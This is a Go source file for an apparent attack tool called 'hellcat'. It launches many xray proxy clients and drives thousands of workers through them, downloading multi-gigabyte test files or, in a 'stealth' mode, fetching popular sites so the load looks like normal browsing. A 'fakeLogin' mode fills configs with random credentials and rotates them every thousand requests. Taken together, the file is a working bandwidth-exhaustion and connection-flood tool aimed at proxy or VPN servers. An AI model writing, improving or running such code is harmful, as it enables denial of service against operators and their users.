package stressor

import (
    "bufio"
    "context"
    "crypto/rand"
    "crypto/tls"
    "errors"
    "fmt"
    "io"
    "log"
    "math/big"
    mathrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "hellcat/config"
    "hellcat/parser"
)

const (
    defaultBurstSize   = 3
    insaneBurstSize    = 6
    defaultCPULimit    = 70
    insaneCPULimit     = 85
    workerBaseSleep    = 50 * time.Millisecond
    workerInsaneSleep  = 20 * time.Millisecond
    workerJitter       = 50 * time.Millisecond
    httpTimeout        = 40 * time.Second
    stealthTimeout     = 20 * time.Second
    errorSleepBase     = 200 * time.Millisecond
    errorSleepJitter   = 800 * time.Millisecond
    statsInterval      = 3 * time.Second
    cpuMonitorInterval = 1 * time.Second
    maxThrottleMs      = 5000
    shutdownTimeout    = 5 * time.Second
    defaultMaxInFlight = 10000
)

var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
}

var defaultPayloads = []string{
    "https://speed.cloudflare.com/__down?bytes=10737418240",
    "https://speed.cloudflare.com/__down?bytes=50000000000",
    "http://speedtest.tele2.net/10GB.zip",
    "http://proof.ovh.net/files/10Gb.dat",
    "https://proof.ovh.net/files/10Gb.dat",
    "http://bouygues.iperf.fr/10G.iso",
    "https://speed.hetzner.de/1GB.bin",
}

var defaultStealthURLs = []string{
    "https://www.google.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/r/popular/.json?limit=100",
    "https://www.amazon.com/",
    "https://www.microsoft.com/en-us/windows",
    "https://www.github.com/",
    "https://en.wikipedia.org/wiki/Main_Page",
    "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://github.com/ArtalkJS/Artalk/releases/download/v2.8.2/artalk_v2.8.2_linux_amd64.tar.gz",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.tiktok.com/",
    "https://t.me/",
    "https://discord.com/",
    "https://www.bbc.com/",
    "https://edition.cnn.com/",
    "https://www.nytimes.com/",
    "https://www.theguardian.com/",
    "https://www.wsj.com/",
    "https://stackoverflow.com/",
    "https://hub.docker.com/",
    "https://www.npmjs.com/",
    "https://pkg.go.dev/",
    "https://dev.to/",
    "https://news.ycombinator.com/",
    "https://www.dropbox.com/",
    "https://drive.google.com/",
    "https://www.icloud.com/",
    "https://imgur.com/",
    "https://flickr.com/",
    "https://www.netflix.com/",
    "https://www.spotify.com/",
    "https://www.twitch.tv/",
    "https://www.imdb.com/",
    "https://www.khanacademy.org/",
    "https://www.coursera.org/",
    "https://www.udemy.com/",
    "https://www.wolframalpha.com/",
    "https://www.ebay.com/",
    "https://www.aliexpress.com/",
    "https://www.walmart.com/",
    "https://www.target.com/",
    "https://weather.com/",
    "https://www.accuweather.com/",
    "https://www.google.com/maps",
    "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css",
    "https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap",
    "https://cdn.pixabay.com/photo/2023/01/01/12/34/sample-768x512.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/a/a5/Example.jpg",
    "https://jsonplaceholder.typicode.com/posts/1",
    "https://api.github.com/repos/golang/go",
    "https://api.weather.gov/points/39.7456,-97.0892",
    "https://wordpress.org/",
    "https://medium.com/",
    "https://habr.com/ru/all/",
    "https://store.steampowered.com/",
    "https://www.epicgames.com/",
}

type stressorRand struct {
    pool sync.Pool
    ctr  int64
}

func newStressorRand() *stressorRand {
    sr := &stressorRand{}
    sr.pool = sync.Pool{
        New: func() interface{} {
            seed := atomic.AddInt64(&sr.ctr, 1) + time.Now().UnixNano()
            return mathrand.New(mathrand.NewSource(seed))
        },
    }
    return sr
}

func (sr *stressorRand) Int63n(n int64) int64 {
    r := sr.pool.Get().(*mathrand.Rand)
    defer sr.pool.Put(r)
    return r.Int63n(n)
}

func (sr *stressorRand) Intn(n int) int {
    r := sr.pool.Get().(*mathrand.Rand)
    defer sr.pool.Put(r)
    return r.Intn(n)
}

type XrayInstance struct {
    Cmd      *exec.Cmd
    Cfg      *parser.OutboundConfig
    Port     int
    ConfPath string
    cleanup  func() // Функция очистки временного файла
    done     chan struct{}
    mu       sync.Mutex
    proxyURL atomic.Value
}

type Stressor struct {
    cfgs          []*parser.OutboundConfig
    threads       int
    duration      int
    numXray       int
    insaneMode    bool
    stealthMode   bool
    customURL     string
    fakeLogin     bool
    cpuTarget     int
    maxInFlight   int
    instances     []*XrayInstance
    clients       []*http.Client
    payloadURLs   []string
    stealthURLs   []string
    requests      uint64
    errors        uint64
    bytesDown     uint64
    activeWorkers int32
    burstSize     int
    ctx           context.Context
    cancel        context.CancelFunc
    wg            sync.WaitGroup
    rand          *stressorRand
    prevCPUIdle   uint64
    prevCPUTotal  uint64
    hasProcStat   int32
    cpuUsage      int32
    throttleMs    int32
    sem           chan struct{}
}

var bufPool = sync.Pool{
    New: func() interface{} {
        return make([]byte, 1024*1024)
    },
}

func fastDiscard(r io.Reader) (int64, bool) {
    buf := bufPool.Get().([]byte)
    defer bufPool.Put(buf)
    var total int64
    success := true
    for {
        n, err := r.Read(buf)
        total += int64(n)
        if err != nil {
            if err != io.EOF {
                success = false
            }
            break
        }
    }
    return total, success
}

func formatSpeed(bytesPerSec float64) string {
    if bytesPerSec >= 1024*1024*1024 {
        return fmt.Sprintf("%.2f GB/s", bytesPerSec/1024/1024/1024)
    }
    if bytesPerSec >= 1024*1024 {
        return fmt.Sprintf("%.1f MB/s", bytesPerSec/1024/1024)
    }
    if bytesPerSec >= 1024 {
        return fmt.Sprintf("%.0f KB/s", bytesPerSec/1024)
    }
    return fmt.Sprintf("%.0f B/s", bytesPerSec)
}

func generateUUID() string {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        return "00000000-0000-0000-0000-000000000000"
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func generatePassword(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    result := make([]byte, length)
    for i := 0; i < length; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
        result[i] = chars[n.Int64()]
    }
    return string(result)
}

func mutateCredentials(cfg *parser.OutboundConfig) {
    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s
    case parser.VMessSettings:
        for i := range s.Vnext {
            for j := range s.Vnext[i].Users {
                s.Vnext[i].Users[j].Id = generateUUID()
            }
        }
        cfg.Settings = s
    case parser.ServerSettings:
        for i := range s.Servers {
            if cfg.Protocol == "tuic" {
                s.Servers[i].Uuid = generateUUID()
            }
            s.Servers[i].Password = generatePassword(16)
        }
        cfg.Settings = s
    }
}

func getRandomPort() (int, error) {
    ln, err := net.Listen("tcp", "127.0.0.1:0")
    if err != nil {
        return 0, err
    }
    port := ln.Addr().(*net.TCPAddr).Port
    ln.Close()
    return port, nil
}

func (s *Stressor) startInstance(i int) (*XrayInstance, error) {
    port, err := getRandomPort()
    if err != nil {
        return nil, fmt.Errorf("port allocation: %w", err)
    }

    cfgCopy := *s.cfgs[i%len(s.cfgs)]
    cfg := &cfgCopy

    if s.fakeLogin {
        mutateCredentials(cfg)
    }

    confPath, cleanup, err := config.GenerateWithPort(cfg, port)
    if err != nil {
        return nil, fmt.Errorf("config generation: %w", err)
    }

    cmd := exec.CommandContext(s.ctx, "xray", "-config", confPath)
    cmd.Stdout = nil
    cmd.Stderr = nil

    if err := cmd.Start(); err != nil {
        cleanup() // Убираем за собой файл, если xray не запустился
        return nil, err
    }

    inst := &XrayInstance{
        Cmd:      cmd,
        Cfg:      cfg,
        Port:     port,
        ConfPath: confPath,
        cleanup:  cleanup,
        done:     make(chan struct{}),
    }
    pURL, _ := url.Parse(fmt.Sprintf("socks5h://127.0.0.1:%d", port))
    inst.proxyURL.Store(pURL)

    go func() {
        if err := cmd.Wait(); err != nil && s.ctx.Err() == nil {
            log.Printf("[hellcat] ⚠️ xray [port %d] exited: %v", port, err)
        }
        close(inst.done)
    }()

    return inst, nil
}

func (s *Stressor) restartInstance(inst *XrayInstance) {
    inst.mu.Lock()
    defer inst.mu.Unlock()

    newPort, err := getRandomPort()
    if err != nil {
        log.Printf("[hellcat] ❌ Failed to get port for restart: %v", err)
        return
    }

    mutateCredentials(inst.Cfg)

    newConfPath, newCleanup, err := config.GenerateWithPort(inst.Cfg, newPort)
    if err != nil {
        log.Printf("[hellcat] ❌ Failed to generate config for restart on port %d: %v", newPort, err)
        return
    }

    cmd := exec.CommandContext(s.ctx, "xray", "-config", newConfPath)
    cmd.Stdout = nil
    cmd.Stderr = nil

    if err := cmd.Start(); err != nil {
        log.Printf("[hellcat] ❌ Failed to start new xray on port %d: %v", newPort, err)
        newCleanup() // Удаляем новый файл, если процесс не стартовал
        return
    }

    newDone := make(chan struct{})
    go func() {
        if err := cmd.Wait(); err != nil && s.ctx.Err() == nil {
            log.Printf("[hellcat] ⚠️ xray (new port %d) exited: %v", newPort, err)
        }
        close(newDone)
    }()

    addr := fmt.Sprintf("127.0.0.1:%d", newPort)
    ready := false
    for i := 0; i < 30 && s.ctx.Err() == nil; i++ {
        conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond)
        if err == nil {
            conn.Close()
            ready = true
            break
        }
        timer := time.NewTimer(300 * time.Millisecond)
        select {
        case <-s.ctx.Done():
            timer.Stop()
        case <-timer.C:
        }
    }

    if !ready {
        log.Printf("[hellcat] ❌ New xray on port %d failed to become ready", newPort)
        if cmd.Process != nil {
            cmd.Process.Kill()
        }
        newCleanup() // Удаляем новый файл, если прокси не прогрелся
        select {
        case <-newDone:
        case <-time.After(shutdownTimeout):
        }
        return
    }

    oldCmd := inst.Cmd
    oldCleanup := inst.cleanup
    oldDone := inst.done

    inst.Cmd = cmd
    inst.Port = newPort
    inst.ConfPath = newConfPath
    inst.cleanup = newCleanup
    inst.done = newDone

    pURL, _ := url.Parse(fmt.Sprintf("socks5h://127.0.0.1:%d", newPort))
    inst.proxyURL.Store(pURL)

    if oldCmd != nil && oldCmd.Process != nil {
        oldCmd.Process.Kill()
    }
    if oldCleanup != nil {
        oldCleanup() // Вот здесь мы избавляемся от утечки старых файлов!
    }
    if oldDone != nil {
        select {
        case <-oldDone:
        case <-time.After(shutdownTimeout):
        }
    }
    log.Printf("[hellcat] 🔑 [Port %d] Restarted successfully", newPort)
}

func readCPUUsageLinux() (idle uint64, total uint64, err error) {
    f, err := os.Open("/proc/stat")
    if err != nil {
        return 0, 0, err
    }
    defer f.Close()

    scanner := bufio.NewScanner(f)
    if !scanner.Scan() {
        return 0, 0, fmt.Errorf("empty /proc/stat")
    }

    fields := strings.Fields(scanner.Text())
    if len(fields) < 5 || fields[0] != "cpu" {
        return 0, 0, fmt.Errorf("invalid /proc/stat format")
    }

    var sum uint64
    for i := 1; i < len(fields); i++ {
        v, _ := strconv.ParseUint(fields[i], 10, 64)
        sum += v
        if i == 4 {
            idle = v
        }
    }
    return idle, sum, nil
}

func (s *Stressor) startCPUMonitor() {
    prevIdle, prevTotal, err := readCPUUsageLinux()
    if err == nil {
        s.prevCPUIdle = prevIdle
        s.prevCPUTotal = prevTotal
        atomic.StoreInt32(&s.hasProcStat, 1)
    } else {
        log.Printf("[hellcat] ⚠️ /proc/stat unavailable, using goroutine fallback for CPU estimation")
        atomic.StoreInt32(&s.hasProcStat, 0)
    }

    go func() {
        ticker := time.NewTicker(cpuMonitorInterval)
        defer ticker.Stop()

        for {
            select {
            case <-s.ctx.Done():
                return
            case <-ticker.C:
                var usage int32 = 0
                idle, total, err := readCPUUsageLinux()
                if err == nil {
                    if atomic.LoadInt32(&s.hasProcStat) == 1 {
                        totalDelta := total - s.prevCPUTotal
                        idleDelta := idle - s.prevCPUIdle
                        if totalDelta > 0 {
                            usage = int32(((totalDelta - idleDelta) * 100) / totalDelta)
                        }
                    } else {
                        atomic.StoreInt32(&s.hasProcStat, 1)
                    }
                    s.prevCPUIdle = idle
                    s.prevCPUTotal = total
                } else {
                    atomic.StoreInt32(&s.hasProcStat, 0)
                }

                if atomic.LoadInt32(&s.hasProcStat) == 0 {
                    ng := runtime.NumGoroutine()
                    usage = 50
                    if ng > 2000 {
                        usage = 95
                    } else if ng > 1000 {
                        usage = 80
                    } else if ng > 500 {
                        usage = 65
                    }
                }
                atomic.StoreInt32(&s.cpuUsage, usage)

                target := int32(s.cpuTarget)
                cur := atomic.LoadInt32(&s.throttleMs)
                diff := usage - target

                var next int32
                switch {
                case diff > 20:
                    next = cur + 100
                case diff > 10:
                    next = cur + 50
                case diff > 0:
                    next = cur + 20
                case diff > -10:
                    next = cur - 10
                case diff > -20:
                    next = cur - 30
                default:
                    next = cur - 50
                }

                if next < 0 {
                    next = 0
                }
                if next > maxThrottleMs {
                    next = maxThrottleMs
                }
                atomic.StoreInt32(&s.throttleMs, next)
            }
        }
    }()
}

func (s *Stressor) applyThrottle() {
    tf := atomic.LoadInt32(&s.throttleMs)
    if tf <= 0 {
        return
    }
    jitter := tf * 3 / 10
    if jitter > 0 {
        tf = tf + int32(s.rand.Int63n(int64(jitter))) - jitter/2
        if tf < 0 {
            tf = 0
        }
    }
    timer := time.NewTimer(time.Duration(tf) * time.Millisecond)
    select {
    case <-s.ctx.Done():
        timer.Stop()
    case <-timer.C:
    }
}

func Run(parentCtx context.Context, cfgs []*parser.OutboundConfig, threads, duration, numXray int, insane, stealth bool, customTarget string, fakelogin bool, cpuTarget, maxInFlight int) {
    if maxInFlight <= 0 {
        maxInFlight = defaultMaxInFlight
    }

    s := &Stressor{
        cfgs:        cfgs,
        threads:     threads,
        duration:    duration,
        numXray:     numXray,
        insaneMode:  insane,
        stealthMode: stealth,
        customURL:   customTarget,
        fakeLogin:   fakelogin,
        cpuTarget:   cpuTarget,
        maxInFlight: maxInFlight,
        burstSize:   defaultBurstSize,
        payloadURLs: defaultPayloads,
        stealthURLs: defaultStealthURLs,
        rand:        newStressorRand(),
        sem:         make(chan struct{}, maxInFlight),
    }

    if s.cpuTarget <= 0 {
        s.cpuTarget = defaultCPULimit
        if s.insaneMode {
            s.cpuTarget = insaneCPULimit
            s.burstSize = insaneBurstSize
        }
    }

    if s.customURL != "" {
        s.payloadURLs = []string{s.customURL}
        s.stealthURLs = []string{s.customURL}
    }

    s.ctx, s.cancel = context.WithCancel(parentCtx)
    defer s.cancel()

    if _, err := exec.LookPath("xray"); err != nil {
        log.Fatalf("[hellcat] ❌ 'xray' binary not found in PATH: %v", err)
    }

    modeStr := "HEAVY BANDWIDTH"
    if s.stealthMode {
        modeStr = "STEALTH BANDWIDTH"
    }
    if s.insaneMode {
        modeStr = "🔥 INSANE " + modeStr
    }

    log.Printf("[hellcat] 🌊 %s MODE ENGAGED", modeStr)
    log.Printf("[hellcat] 📊 %d xray instances | %d threads | burst=%d | max_inflight=%d", numXray, threads, s.burstSize, s.maxInFlight)
    log.Printf("[hellcat] 🧠 CPU target: %d%%", s.cpuTarget)

    s.startCPUMonitor()

    if s.duration > 0 {
        log.Printf("[hellcat] ⏱️  Duration: %d sec", s.duration)
        time.AfterFunc(time.Duration(s.duration)*time.Second, func() {
            log.Println("[hellcat] ⏰ Stopping...")
            s.cancel()
        })
    }

    s.instances = make([]*XrayInstance, s.numXray)
    for i := 0; i < s.numXray; i++ {
        inst, err := s.startInstance(i)
        if err != nil {
            log.Printf("[hellcat] ❌ xray [%d] start: %v", i, err)
            continue
        }
        s.instances[i] = inst
        log.Printf("[hellcat] ✓ xray [%d] PID %d Port %d", i, inst.Cmd.Process.Pid, inst.Port)
        time.Sleep(50 * time.Millisecond)
    }

    log.Println("[hellcat] ⏳ Waiting for SOCKS proxies...")
    for _, inst := range s.instances {
        if inst == nil {
            continue
        }
        addr := fmt.Sprintf("127.0.0.1:%d", inst.Port)
        for i := 0; i < 30 && s.ctx.Err() == nil; i++ {
            conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond)
            if err == nil {
                conn.Close()
                break
            }
            timer := time.NewTimer(300 * time.Millisecond)
            select {
            case <-s.ctx.Done():
                timer.Stop()
            case <-timer.C:
            }
        }
    }

    s.clients = make([]*http.Client, s.numXray)
    for i, inst := range s.instances {
        if inst == nil {
            continue
        }
        tr := &http.Transport{
            Proxy: func(req *http.Request) (*url.URL, error) {
                if u := inst.proxyURL.Load(); u != nil {
                    return u.(*url.URL), nil
                }
                return nil, errors.New("proxy not ready")
            },
            DialContext: (&net.Dialer{
                Timeout:   10 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
            DisableKeepAlives:     false,
            DisableCompression:    false,
            MaxIdleConns:          100,
            MaxIdleConnsPerHost:   10,
            IdleConnTimeout:       90 * time.Second,
            TLSHandshakeTimeout:   10 * time.Second,
            ResponseHeaderTimeout: 15 * time.Second,
        }
        s.clients[i] = &http.Client{Transport: tr}
    }

    streamsPerProxy := s.threads / s.numXray
    if streamsPerProxy < 10 {
        streamsPerProxy = 10
    }
    if s.insaneMode {
        streamsPerProxy *= 2
    }

    totalGoroutines := streamsPerProxy * s.numXray
    log.Printf("[hellcat] 🚀 Spawning %d workers...", totalGoroutines)

    for i := 0; i < s.numXray; i++ {
        if s.clients[i] == nil {
            continue
        }
        client := s.clients[i]
        for j := 0; j < streamsPerProxy; j++ {
            s.wg.Add(1)
            go s.worker(client)
        }
    }

    ticker := time.NewTicker(statsInterval)
    defer ticker.Stop()

    var lastRotationReq uint64 = 0
    lastTickTime := time.Now()

    for {
        select {
        case <-s.ctx.Done():
            goto cleanup
        case <-ticker.C:
            now := time.Now()
            elapsed := now.Sub(lastTickTime).Seconds()
            lastTickTime = now
            if elapsed <= 0 {
                elapsed = statsInterval.Seconds()
            }

            succ := atomic.LoadUint64(&s.requests)
            fail := atomic.LoadUint64(&s.errors)
            bytes := atomic.SwapUint64(&s.bytesDown, 0)
            speed := formatSpeed(float64(bytes) / elapsed)
            inFlight := len(s.sem)

            log.Printf("[hellcat] 🌊 %s | Req: %d | Err: %d | Active: %d | InFlight: %d/%d | CPU: %d%% | throttle: %dms",
                speed, succ, fail, atomic.LoadInt32(&s.activeWorkers),
                inFlight, s.maxInFlight,
                atomic.LoadInt32(&s.cpuUsage), atomic.LoadInt32(&s.throttleMs))

            if s.fakeLogin && succ > 0 {
                currentThousand := succ / 1000
                lastThousand := lastRotationReq / 1000
                if currentThousand > lastThousand {
                    lastRotationReq = succ
                    log.Printf("[hellcat] 🔑 Crossed %dk requests! Rotating...", currentThousand*1000)
                    go func() {
                        for _, inst := range s.instances {
                            if inst != nil {
                                s.restartInstance(inst)
                            }
                        }
                    }()
                }
            }
        }
    }

cleanup:
    log.Println("[hellcat] 🧹 Cleaning up resources...")
    s.cancel()
    s.wg.Wait()

    for _, inst := range s.instances {
        if inst == nil {
            continue
        }
        select {
        case <-inst.done:
        case <-time.After(shutdownTimeout):
        }

        if inst.cleanup != nil {
            inst.cleanup()
        }
    }
    log.Println("[hellcat] ✅ Finished.")
}

func (s *Stressor) worker(client *http.Client) {
    defer s.wg.Done()
    atomic.AddInt32(&s.activeWorkers, 1)
    defer atomic.AddInt32(&s.activeWorkers, -1)

    for {
        select {
        case <-s.ctx.Done():
            return
        default:
            s.applyThrottle()

            for i := 0; i < s.burstSize; i++ {
                select {
                case <-s.ctx.Done():
                    return
                default:
                    if s.stealthMode {
                        s.stealthSingle(client)
                    } else {
                        s.downloadSingle(client)
                    }
                }
            }

            baseSleep := workerBaseSleep
            if s.insaneMode {
                baseSleep = workerInsaneSleep
            }
            timer := time.NewTimer(baseSleep + time.Duration(s.rand.Int63n(int64(workerJitter))))
            select {
            case <-s.ctx.Done():
                timer.Stop()
                return
            case <-timer.C:
            }
        }
    }
}

func (s *Stressor) downloadSingle(client *http.Client) {
    if len(s.payloadURLs) == 0 {
        return
    }
    target := s.payloadURLs[s.rand.Intn(len(s.payloadURLs))]

    select {
    case s.sem <- struct{}{}:
        defer func() { <-s.sem }()
    case <-s.ctx.Done():
        return
    }

    ctx, cancel := context.WithTimeout(s.ctx, httpTimeout)
    defer cancel()

    req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
    if err != nil {
        atomic.AddUint64(&s.errors, 1)
        return
    }

    req.Header.Set("User-Agent", userAgents[s.rand.Intn(len(userAgents))])
    req.Header.Set("Accept-Encoding", "identity")
    req.Header.Set("Connection", "close")

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&s.errors, 1)
        timer := time.NewTimer(errorSleepBase + time.Duration(s.rand.Int63n(int64(errorSleepJitter))))
        select {
        case <-ctx.Done():
            timer.Stop()
        case <-timer.C:
        }
        return
    }
    defer resp.Body.Close()

    if resp.ContentLength == 0 {
        atomic.AddUint64(&s.requests, 1)
        return
    }

    n, ok := fastDiscard(resp.Body)
    atomic.AddUint64(&s.bytesDown, uint64(n))

    if ok {
        atomic.AddUint64(&s.requests, 1)
    } else {
        atomic.AddUint64(&s.errors, 1)
    }
}

func (s *Stressor) stealthSingle(client *http.Client) {
    if len(s.stealthURLs) == 0 {
        return
    }
    target := s.stealthURLs[s.rand.Intn(len(s.stealthURLs))]

    select {
    case s.sem <- struct{}{}:
        defer func() { <-s.sem }()
    case <-s.ctx.Done():
        return
    }

    ctx, cancel := context.WithTimeout(s.ctx, stealthTimeout)
    defer cancel()

    req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
    if err != nil {
        atomic.AddUint64(&s.errors, 1)
        return
    }

    req.Header.Set("User-Agent", userAgents[s.rand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&s.errors, 1)
        timer := time.NewTimer(errorSleepBase + time.Duration(s.rand.Int63n(int64(errorSleepJitter))))
        select {
        case <-ctx.Done():
            timer.Stop()
        case <-timer.C:
        }
        return
    }
    defer resp.Body.Close()

    if resp.ContentLength == 0 {
        atomic.AddUint64(&s.requests, 1)
        return
    }

    n, ok := fastDiscard(resp.Body)
    atomic.AddUint64(&s.bytesDown, uint64(n))

    if ok {
        atomic.AddUint64(&s.requests, 1)
    } else {
        atomic.AddUint64(&s.errors, 1)
    }
}
